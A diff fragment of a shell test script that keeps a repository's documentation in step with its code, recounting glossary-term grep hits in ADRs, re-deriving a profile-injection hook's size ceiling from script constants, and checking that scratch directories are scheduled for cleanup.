+  gc_claim=$(claimed_glossary_cost_GC "$gc_term")
+  gc_actual=$(count_glossary_term_GC "$gc_term")
+  assert_eq "$gc_actual" "$gc_claim" "GLOSSARY-COST: exclusion 4b publishes '$gc_claim' (hits, files) as the cost of leaving '$gc_term' out of GLOSSARY_AVOID_REGEX; recounted over the scan's own scope it is '$gc_actual'. Update that bullet"
+done
+
+# --- The two files the 4a denylist exempts, and how long they are.
+claimed_denylist_lines_GC() {
+  # claimed_denylist_lines_GC <path> -> the length exclusion 4a publishes.
+  sed -n "s|.*glossary-denylist-lines $1: \\([0-9][0-9]*\\).*|\\1|p" "$invariants_file_GC"
+}
+
+for gc_path in docs/specs/2026-08-13-hoard-design.md docs/plans/2026-08-13-hoard-phase-1.md; do
+  gc_len_claim=$(claimed_denylist_lines_GC "$gc_path")
+  gc_len_actual=$(awk 'END { print NR }' "$repo_root/$gc_path")
+  assert_eq "yes" "$([ -n "$gc_len_claim" ] && echo yes || echo no)" "GLOSSARY-COST, control: exclusion 4a must publish a length for $gc_path in the documented shape"
+  assert_eq "$gc_len_actual" "$gc_len_claim" "GLOSSARY-COST: exclusion 4a publishes $gc_path as $gc_len_claim lines; it is $gc_len_actual. Update that figure"
+done
+
+# --- The docs/adr/ prefix: the two hit sets must match exactly.
+adr_hits_actual_GC=$(grep -nwiE "$GLOSSARY_AVOID_REGEX" "$repo_root"/docs/adr/*.md 2>/dev/null \
+  | sed "s|^$repo_root/||" | cut -d: -f1,2 | sort)
+adr_hits_claimed_GC=$(sed -n 's/.*adr-glossary-hit \(docs\/adr\/[^ :`]*:[0-9][0-9]*\).*/\1/p' "$invariants_file_GC" | sort -u)
+adr_hits_actual_count_GC=$(printf '%s\n' "$adr_hits_actual_GC" | grep -c . || true)
+adr_hits_actual_files_GC=$(printf '%s\n' "$adr_hits_actual_GC" | cut -d: -f1 | sort -u | grep -c . || true)
+
+assert_eq "yes" "$([ -n "$adr_hits_claimed_GC" ] && echo yes || echo no)" "GLOSSARY-COST, control: the docs/adr/ giveaway list must be readable in its documented tag shape - an unreadable list would compare an empty set against an empty set and pass while proving nothing"
+assert_eq "$adr_hits_actual_GC" "$adr_hits_claimed_GC" "GLOSSARY-COST: the docs/adr/ giveaway list must name exactly the lines the scan's own grep finds under that prefix. Recounted set is above; the comment's set is below"
+assert_eq "6" "$adr_hits_actual_count_GC" "GLOSSARY-COST: the comment says SIX lines match GLOSSARY_AVOID_REGEX under docs/adr/; the grep finds $adr_hits_actual_count_GC. It said five for as long as it was six"
+assert_eq "3" "$adr_hits_actual_files_GC" "GLOSSARY-COST: the comment says those lines sit in three ADRs; the grep finds $adr_hits_actual_files_GC"
+
+# Each phrase the list QUOTES must still live on the line the list cites.
+# The line number is not written twice: it is looked up from the phrase and
+# then required to be present in the claimed set above. That is what closes
+# the specific rot found here - 0008:63 named a real line of a real file,
+# and quoted a sentence that had moved 136 lines down.
+gc_quote_probe() {
+  # gc_quote_probe <path> <phrase> - "<path>:<line>" of the first line
+  # holding <phrase>, or empty.
+  gqp_n=$(grep -nF -- "$2" "$repo_root/$1" 2>/dev/null | head -n 1 | cut -d: -f1) || gqp_n=""
+  [ -n "$gqp_n" ] || return 0
+  printf '%s:%s' "$1" "$gqp_n"
+}
+
+gc_probe_0008a=$(gc_quote_probe "docs/adr/0008-hoard-auto-allow.md" "the skill's own instruction not to write one is the only thing in front of it")
+gc_probe_0008b=$(gc_quote_probe "docs/adr/0008-hoard-auto-allow.md" "Google OAuth client secrets")
+gc_probe_0004=$(gc_quote_probe "docs/adr/0004-tiered-parity-across-targets.md" "each gets the deepest integration its host actually supports")
+for gc_probe in "$gc_probe_0008a" "$gc_probe_0008b" "$gc_probe_0004"; do
+  assert_eq "yes" "$([ -n "$gc_probe" ] && echo yes || echo no)" "GLOSSARY-COST, control: every sentence the docs/adr/ giveaway list quotes must still be findable in the ADR it is attributed to - a vanished quote would make the citation check below vacuous"
+  assert_contains "$adr_hits_claimed_GC" "$gc_probe" "GLOSSARY-COST: the giveaway list quotes a sentence that lives at $gc_probe, but cites a different line for it. Cite $gc_probe"
+done
+
+# --- "Nowhere else in the repo produces either phrase", as a check.
+# Stated without naming the three files, deliberately: what the claim means
+# is that every tracked markdown file carrying "memory bank" or "knowledge
+# base" is one the glossary denylist exempts, i.e. none of them is in
+# $glossary_scope_files. Naming them would be a fourth hand-maintained list.
+mbkb_files_GC=""
+mbkb_in_scope_GC=""
+for f in $(git -C "$repo_root" ls-files); do
+  case "$f" in
+    *.md | *.mdc) ;;
+    *) continue ;;
+  esac
+  grep -qwiE "memory bank|knowledge base" "$repo_root/$f" 2>/dev/null || continue
+  mbkb_files_GC="$mbkb_files_GC $f"
+  case " $glossary_scope_files " in
+    *" $f "*) mbkb_in_scope_GC="$mbkb_in_scope_GC $f" ;;
+  esac
+done
+assert_eq "yes" "$([ -n "$mbkb_files_GC" ] && echo yes || echo no)" "GLOSSARY-COST, control: some tracked markdown file must carry 'memory bank' or 'knowledge base' - CONTEXT.md's own avoid list does, and a repo where none did would make the check below vacuous"
+assert_eq "" "$mbkb_in_scope_GC" "GLOSSARY-COST: every file carrying 'memory bank' or 'knowledge base' must be one the glossary denylist exempts (it is quoting the avoid list, not breaking it). A file in the scan's own scope carrying either phrase is the violation the two terms were added to catch"
+
+# ==========================================================================
+# PROFILE-CAP-COUNT. PLAN.md's profile cap figure, re-derived from the hook.
+#
+#     PLAN.md said "The SessionStart hook caps what it injects at 100 lines
+#     / 4 KB". It caps the profile BODY at those, and two fixed additions
+#     were deliberately moved OUTSIDE that budget when the per-line/
+#     per-stream byte bug was fixed: the truncation notice, and the
+#     "[profile] " marker neutralise_forged_lines puts in front of any body
+#     line spelling a reserved prefix - PROFILE_MAX_LINES of them in the
+#     worst case. So the sentence understated the real ceiling by about a
+#     kilobyte, and understated it in the one document a reader goes to for
+#     the budget.
+#
+#     scripts/load-profile.sh already carries the arithmetic beside
+#     PROFILE_MAX_LINES, and tests/test_hooks.sh 34b-G already asserts the
+#     1000-byte marker cost against the real hook. What was missing is
+#     anything tying PLAN.md to either. This recomputes the ceiling from
+#     the script's own three constants and requires both documents to
+#     publish it, so the two cannot drift apart again - and, like
+#     GLOSSARY-COST, it fails and prints the right number rather than
+#     needing anyone to remember to recheck.
+#
+#     KB here is 1000 bytes, not 1024, because that is the unit
+#     scripts/load-profile.sh's own comment uses ("About 5.1 KB, against
+#     4.1 KB before"); the point of the figure is the order of magnitude
+#     and the fact that neither addition scales with profile.md.
+# ==========================================================================
+lp_file_PC="$repo_root/scripts/load-profile.sh"
+plan_body_PC=$(cat "$repo_root/PLAN.md" 2>/dev/null || printf '')
+lp_body_PC=$(cat "$lp_file_PC" 2>/dev/null || printf '')
+
+max_lines_PC=$(sed -n 's/^PROFILE_MAX_LINES=\([0-9][0-9]*\)$/\1/p' "$lp_file_PC")
+max_bytes_PC=$(sed -n 's/^PROFILE_MAX_BYTES=\([0-9][0-9]*\)$/\1/p' "$lp_file_PC")
+marker_len_PC=$(sed -n "s/^PROFILE_LINE_MARKER='\\(.*\\)'\$/\\1/p" "$lp_file_PC" | awk '{ print length($0) }')
+
+assert_eq "yes" "$([ -n "$max_lines_PC" ] && [ -n "$max_bytes_PC" ] && [ -n "$marker_len_PC" ] && [ "$marker_len_PC" -gt 0 ] && echo yes || echo no)" "PROFILE-CAP-COUNT, control: PROFILE_MAX_LINES, PROFILE_MAX_BYTES and PROFILE_LINE_MARKER must all be readable out of scripts/load-profile.sh - a renamed or reshaped constant would otherwise make every figure below compare against an empty string"
+
+marker_cost_PC=$((max_lines_PC * marker_len_PC))
+# LC_ALL=C on the awk: `printf "%.1f"` honours the locale's decimal
+# separator, so under pt_BR/de_DE/fr_FR this produced "5,1" and reported a
+# drift that was really a comma. Caught on the machine this was written on,
+# which is exactly the kind of environment-shaped false failure a fixed
+# figure must not have.
+ceiling_kb_PC=$(LC_ALL=C awk -v b="$max_bytes_PC" -v m="$marker_cost_PC" 'BEGIN { printf "%.1f", (b + m) / 1000 }')
+
+assert_contains "$plan_body_PC" "$max_lines_PC × $marker_len_PC" "PROFILE-CAP-COUNT: PLAN.md must show where the marker budget comes from - PROFILE_MAX_LINES × the marker's length, $max_lines_PC × $marker_len_PC as the hook defines them today"
+assert_contains "$plan_body_PC" "= $marker_cost_PC bytes" "PROFILE-CAP-COUNT: PLAN.md must publish the marker budget itself, $marker_cost_PC bytes"
+assert_contains "$plan_body_PC" "$ceiling_kb_PC KB" "PROFILE-CAP-COUNT: PLAN.md must publish the real worst case, about $ceiling_kb_PC KB (PROFILE_MAX_BYTES $max_bytes_PC + $marker_cost_PC bytes of markers + one notice line), not the body cap alone"
+assert_contains "$lp_body_PC" "$ceiling_kb_PC KB" "PROFILE-CAP-COUNT: scripts/load-profile.sh must publish the same worst case beside its own constants - two documents naming one ceiling is how they stay in step"
+assert_not_contains "$plan_body_PC" "caps what it injects at $max_lines_PC lines" "PROFILE-CAP-COUNT: PLAN.md must not describe the cap as bounding what the hook INJECTS. It bounds the profile BODY; the truncation notice and the markers are added after the cut, on purpose, and saying otherwise understates the ceiling by about a kilobyte"
+
+# ==========================================================================
+# SCRATCH-LEAK. Every path this run put in $TMPDIR is on the trap's list.
+# This file's own leak was one directory per run, caused by a second
+# `trap ... EXIT` replacing the first — see the cleanup header at the top.
+# Runs BEFORE the trap fires, so it asserts that each path is SCHEDULED,
+# not that it is already gone.
+# ==========================================================================
+assert_no_scratch_leak "$scratch_before" "$cleanup_paths" "SCRATCH-LEAK: every scratch directory this file creates must be appended to \$cleanup_paths, which the single EXIT trap removes - giving one its own \`trap ... EXIT\` disinherits every path registered before it"
 
 assert_report
